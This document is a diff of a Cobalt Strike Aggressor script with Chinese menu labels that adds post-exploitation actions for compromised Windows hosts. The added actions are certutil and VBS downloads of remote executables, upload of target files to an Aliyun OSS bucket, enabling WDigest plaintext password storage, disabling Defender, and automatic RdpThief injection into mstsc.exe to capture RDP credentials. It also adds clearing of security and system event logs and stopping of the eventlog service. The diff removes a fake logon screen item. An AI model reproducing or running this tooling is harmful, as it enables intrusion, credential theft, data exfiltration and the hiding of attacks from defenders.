@@ -1,4 +1,77 @@
 menu "辅助功能" {
+
+menu "下载文件" {
+	
+item "certutil下载文件" {
+    $bid = $1['@'];
+    $dialog = dialog("certutil远程下载", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &certutil);
+    dialog_description($dialog, "certutil命令远程文件下载。");
+    drow_text($dialog, "url", "远程文件地址: ");
+    drow_text($dialog, "path", "本地储存文件: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub certutil {
+    $url = $3['url'];
+    $path = $3['path'];
+    bshell($bid, "certutil.exe -urlcache -split -f $url $path");
+  }
+
+  item "vbs下载文件" {
+    $bid = $1['@'];
+    $dialog = dialog("vbs下载文件", %(url => "http://xxxx", path => "C:\\Windows\\Temp\\helper.exe", bid => $bid), &vbs);
+    dialog_description($dialog, "vbs脚本远程下载文件，命令行传参，执行完毕自动清除vbs下载脚本。");
+    drow_text($dialog, "url", "远程文件地址: ");
+    drow_text($dialog, "path", "本地储存文件: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub vbs {
+    $url = $3['url'];
+    $path = $3['path'];
+    bupload($bid, script_resource("/modules/Assist/download.vbs"));
+    bshell($bid, "download.vbs $url $path");
+    bshell($bid, "del /f /s /q download.vbs");
+  }
+
+
+}
+
+item "SharpZip(压缩文件夹)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpZip压缩打包文件", %(file => "C:\\Windows\\Temp", path => "C:\\Windows\\Temp.zip", bid => $bid), &SharpZip);
+    drow_text($dialog, "file", "file:  ");
+    drow_text($dialog, "path", "path:  ");
+    dialog_description($dialog, "对目录或文件进行压缩打包。项目地址：https://github.com/uknowsec/SharpZip");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpZip {
+    $arg = join('', @("$3['file'] $3['path']"));
+    bexecute_assembly($bid, script_resource("/modules/Assist/SharpZip.exe"), $arg);
+  }
+
+  item "SharpOSS(上传文件)" {
+    $bid = $1['@'];
+    $dialog = dialog("SharpOSS", %(bucketName => "", accessKeyId => "", accessKeySecret => "", endpoint => "oss-cn-chengdu.aliyuncs.com", UploadFilePath => "C:\\Windows\\Temp\\bak.zip", bid => $bid), &SharpOSS);
+    dialog_description($dialog, "通过aliyun-oss-csharp-sdk快速上传目标系统文件到阿里云OSS。项目地址：https://github.com/uknowsec/SharpOSS");
+    drow_text($dialog, "bucketName", "BucketName: ");
+    drow_text($dialog, "accessKeyId", "AccessKeyId: ");
+    drow_text($dialog, "accessKeySecret", "AccessKeySecret: ");
+    drow_text($dialog, "endpoint", "Endpoint: ");
+    drow_text($dialog, "UploadFilePath", "UploadFilePath: ");
+    dbutton_action($dialog, "运行");
+    dialog_show($dialog);
+  }
+  sub SharpOSS {
+    $bucketName = $3['bucketName'];
+    $accessKeyId = $3['accessKeyId'];
+    $accessKeySecret = $3['accessKeySecret'];
+    $endpoint = $3['endpoint'];
+    $UploadFilePath = $3['UploadFilePath'];
+    $arg = join(' ', @($3['bucketName'],$3['accessKeyId'],$3['accessKeySecret'],$3['endpoint'],$3['UploadFilePath']));
+    bexecute_assembly($bid, script_resource("/modules/Assist/SharpOSS.exe"), $arg);
+  }
 	item "获取远程连接主机的密码" {
 			show_message("没有管理员权限不能够获取到加密的密钥");
 			binput($1,"shell cmdkey /list");
@@ -28,24 +101,16 @@ menu "辅助功能" {
 	}
 	separator();
 	item "开启远程桌面(Win_Api)" {
-			bupload($1,script_resource("./modules/reg_open_3389.exe"));
+			bupload($1,script_resource("./modules/Assist/reg_open_3389.exe"));
 			bshell($1,"attrib reg_open_3389.exe +s +h");
 			bshell($1,"reg_open_3389.exe");
-	}
-	separator();
-	item "FakeTheScreen" {
-		$dialog = dialog("QAQ",%(bid => $1["@"] , os => "Win7") ,&FakerScreen);
-		dialog_description($dialog,"QAQ");
-		drow_combobox($dialog,"os","系统:",@("Win7","Win10"));
-		dbutton_action($dialog,"Exploit");
-		dialog_show($dialog);
 	}
 	separator();
 	item "启用Wdigest保存明文口令" {
 		if (-isadmin $1["@"])
 		{
-						binput($1["@"],"reg add HKLM\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
-			bshell($1["@"],"reg add HKLM\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+						binput($1["@"],"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
+			bshell($1["@"],"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f");
 		}
 		else
 		{
@@ -53,27 +118,90 @@ menu "辅助功能" {
 		}
 		}
 	separator();
-	item "测试" {
-		if( -isadmin $1['@'])
-		{
-			show_message("admin!");
-		}
-		else
-		{
-			show_message("admin?");
-		}
 
-	}
+  item "组策略关闭defender" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /d 1 /t REG_DWORD");
+      }
+    }
+   menu "RdpThief"{
+        item "开启Rdpthief"{
+            blog($1, "RdpThief enabled \n");
+            add(@beacons,$1,0);
+        }
+
+        item "关闭Rdpthief"{
+            blog($1, "Disabling RdpThief");
+            remove(@beacons,$1);
+        }
+
+        item "提取Rdpthief记录"{
+            bshell($1,"type %temp%\\data.bin");
+        }
+    }
+	menu "日志清除" {
+  item "清除系统日志" {
+    prompt_text("再次确认清除系统日志：", "请详细阅读网络安全法", lambda({
+      bshell(@ids, "wevtutil cl security");
+      bshell(@ids, "wevtutil cl system");
+      bshell(@ids, "wevtutil cl application");
+      bshell(@ids, "wevtutil cl \"windows powershell\"");
+    }, @ids => $1));
+  }
+  item "禁用事件服务" {
+      local('$bid');
+      foreach $bid ($1){
+        bshell($1, "sc stop Schedule");
+        bshell($1, "sc stop wecsvc");
+        bshell($1, "sc stop eventlog");
+      }
+    }
+
+}
+  item "测试" {
+    if( -isadmin $1['@'])
+    {
+      show_message("admin!");
+    }
+    else
+    {
+      show_message("admin?");
+    }
+
+  }
+
+}
+
+@beacons = @();
+@pids = @();
+
+on heartbeat_5s{
+
+    foreach $index => $beaconid (@beacons)
+    {
+       
+        bps($beaconid,&handleProcess);
+    } 
+
 }
 
 
-sub FakerScreen {
-	if ($3["os"] eq "Win7")
-	{
-		bexecute_assembly($3["bid"],script_resource("./modules/fakelogonscreen_trunk/DOTNET35/FakeLogonScreen.exe"));
-	}
-	else
-	{
-		bexecute_assembly($3["bid"],script_resource("./modules/fakelogonscreen_trunk/FakeLogonScreen.exe"));
-	}
+sub handleProcess{
+  
+  $processList = $2;
+  $index = indexOf($processList, "mstsc.exe", 0) + 9;
+
+  if($index > 9){
+
+    $temp = substr($processList,$index,-1);
+    $pid = split("\t",$temp)[2];
+
+    if ($pid !in @pids){
+      add(@pids,$pid,0);
+      blog($1,"Injecting into mstsc.exe with PID: $pid");
+      bshinject($1, $pid , "x64" ,script_resource("/modules/Assist/RdpThief_x64.tmp"));
+    }
+    
+  }
 }
